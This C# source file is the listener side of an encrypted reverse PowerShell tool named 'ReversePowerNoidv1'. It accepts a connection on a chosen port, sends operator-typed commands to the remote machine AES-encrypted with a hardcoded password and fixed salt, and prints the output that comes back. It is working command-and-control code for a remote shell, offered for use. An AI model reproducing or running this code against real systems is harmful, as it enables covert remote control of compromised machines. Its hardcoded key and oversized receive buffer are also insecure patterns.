using System;  
using System.Net;  
using System.Net.Sockets;  
using System.Text; 
using System.Security.Cryptography;
using System.IO; 
  
public class SynchronousSocketListener {  

    public static string Password = "Sup3rS3cur3P4ssw0rd";
    public static string ReadLine()
    {
        Stream inputStream = Console.OpenStandardInput(100000);
        byte[] bytes = new byte[100000];
        int outputLength = inputStream.Read(bytes, 0, 100000);
        //Console.WriteLine(outputLength);
        char[] chars = Encoding.UTF7.GetChars(bytes, 0, outputLength);
        return new string(chars);
    }

    public static byte[] ReadByteArray(Stream s)
    {
        byte[] rawLength = new byte[sizeof(int)];
        if (s.Read(rawLength, 0, rawLength.Length) != rawLength.Length)
        {
            throw new SystemException("Stream did not contain properly formatted byte array");
        }

        byte[] buffer = new byte[BitConverter.ToInt32(rawLength, 0)];
        if (s.Read(buffer, 0, buffer.Length) != buffer.Length)
        {
            throw new SystemException("Did not read byte array properly");
        }

        return buffer;
    }

    public static string EncryptStringAES(string rawstring, string password) {
        byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
        string outStr = null;                       
        RijndaelManaged aesAlg = null;              
        try {
            Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(password, saltBytes);
            aesAlg = new RijndaelManaged();
            aesAlg.Key = key.GetBytes(aesAlg.KeySize / 8);
            ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);
            using (MemoryStream msEncrypt = new MemoryStream())
            {
                msEncrypt.Write(BitConverter.GetBytes(aesAlg.IV.Length), 0, sizeof(int));
                msEncrypt.Write(aesAlg.IV, 0, aesAlg.IV.Length);
                using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                {
                    using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                    {
                        swEncrypt.Write(rawstring);
                    }
                }
                outStr = Convert.ToBase64String(msEncrypt.ToArray());
            }
        }
        finally
        {
            if (aesAlg != null)
                aesAlg.Clear();
        }
        return outStr;
    }

    public static string DecryptStringAES(string encryptedString, string password) {
        byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
        RijndaelManaged aesAlg = null;
        string plaintext = null;
        try
        {
            Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(password, saltBytes);
            byte[] bytes = Convert.FromBase64String(encryptedString);
            using (MemoryStream msDecrypt = new MemoryStream(bytes)) {
                aesAlg = new RijndaelManaged();
                aesAlg.Key = key.GetBytes(aesAlg.KeySize / 8);
                aesAlg.IV = ReadByteArray(msDecrypt);
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                {
                    using (StreamReader srDecrypt = new StreamReader(csDecrypt)) {
                        plaintext = srDecrypt.ReadToEnd();
                    }
                }
            }
        }
        finally
        {
            if (aesAlg != null)
                aesAlg.Clear();
        }
        return plaintext;
    }
  
    public static void StartListening(int port) {  
        Console.WriteLine("[+++] ReversePowerNoidv1 - Reverse Powershell has never been this paranoid.");
        // Establish the local endpoint for the socket.  
        // Dns.GetHostName returns the name of the
        // host running the application.  
        IPAddress ipAddress = IPAddress.Parse("0.0.0.0"); 
        IPEndPoint localEndPoint = new IPEndPoint(ipAddress, port);  

        // Create a TCP/IP socket.  
        Socket listener = new Socket(ipAddress.AddressFamily,  
            SocketType.Stream, ProtocolType.Tcp );  
  
        // Bind the socket to the local endpoint and
        // listen for incoming connections.  
        try {  
            listener.Bind(localEndPoint);  
            listener.Listen(10);  
  
            // Start listening for connections.  
            Console.Write("[*] Waiting for a connection...");  
            // Program is suspended while waiting for an incoming connection.  
            Socket handler = listener.Accept();  
            Console.WriteLine("Connected to {0}!", handler.RemoteEndPoint.ToString());
            while (true) {
                string pwd = Receive(handler);
                Console.Write("RPN {0}> ", pwd);
                string command = ReadLine().Trim();
                if (String.IsNullOrEmpty(command)) {
                    Send(handler, "NOCOMM");
                    continue;
                }
                if (String.Equals(command, "exit", StringComparison.OrdinalIgnoreCase)) {
                    Send(handler, command);
                    break;
                }
                Send(handler, command);
                string respond = Receive(handler);
                Console.WriteLine(respond);
            }
            try {
                handler.Shutdown(SocketShutdown.Both);  
                handler.Close();
            }catch {}
  
        } catch (Exception e) {  
            Console.WriteLine(e.ToString());  
        }  
  
        Console.WriteLine("\nPress ENTER to continue...");  
        Console.Read();  
  
    }  

    public static void Send(Socket handler, String data) {
        string dataEnc = EncryptStringAES(data, Password);
        // Convert the string data to byte data using ASCII encoding.
        byte[] byteData = Encoding.ASCII.GetBytes(dataEnc);
        handler.Send(byteData);
    }

    public static string Receive(Socket handler) {
        byte[] bytes = new byte[501474836];  
        int bytesRec = handler.Receive(bytes);
        return DecryptStringAES(Encoding.ASCII.GetString(bytes,0,bytesRec), Password);
    }
  
    public static void Main(String[] args) {  
        int port = 0;
        if (args.Length < 1) {
            Console.WriteLine("Usage : server.exe <port>");
            return;
        }
        if (!Int32.TryParse(args[0], out port)) {
            Console.WriteLine("[-] Please enter a valid port for the first parameter!");
            return;
        }
        if (port > 65535 || port == 0) {
            Console.WriteLine("[-] Please enter a valid port for the first parameter!");
            return;
        }
        StartListening(port);  
        return;  
    }  
}  